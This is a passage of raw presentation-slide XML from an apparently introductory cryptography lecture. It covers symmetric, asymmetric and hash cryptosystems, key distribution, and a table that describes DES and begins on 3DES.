              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Symmetric</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Single or 1-key encryption</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="561"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="7030a0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Public</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="7030a0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>key</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Asymmetric</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Dual or 2-key encryption</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="561"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="7030a0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Hash</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>One-way transformation</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4"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Symmetric Key Cryptosystems</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="895" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="3809520" cy="4343040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>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"Secret-Key" Encryption</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="380"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1900" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fast! Single key for encryption and decryption</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1900" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="380"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1900" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Requires secure key distribution channel (scalability)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1900" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="380"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1900" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>No technical non-repudiation</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1900" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="896" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4648320" y="1752480"/>
            <a:ext cx="3809520" cy="4343040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="004666"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Requires a secure channel:</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="800280" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Pre-shared key</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="800280" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Asymmetric encryption</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="800280" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Diffie-Hellman key exchange</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="561"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="897" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009800" y="3788640"/>
            <a:ext cx="6990840" cy="2878560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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Symmetric Algorithms</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="899" name="Group 227"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="685800" y="1295280"/>
          <a:ext cx="7772040" cy="4773240"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="1413000"/>
                <a:gridCol w="1249560"/>
                <a:gridCol w="5109480"/>
              </a:tblGrid>
              <a:tr h="731520">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="281"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>Symmetric Encryption Algorithm</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="dddddd"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="281"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>Key length</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="281"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>(in bits)</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="dddddd"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="281"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>Description</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="dddddd"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="1006200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>DES</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="221"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>56</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>Designed at IBM during the 1970s and was the NIST standard until 1997.</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>Although considered outdated, DES remains widely in use. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>Designed to be implemented only in hardware, and is therefore slower in software. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="975600">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>3DES</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
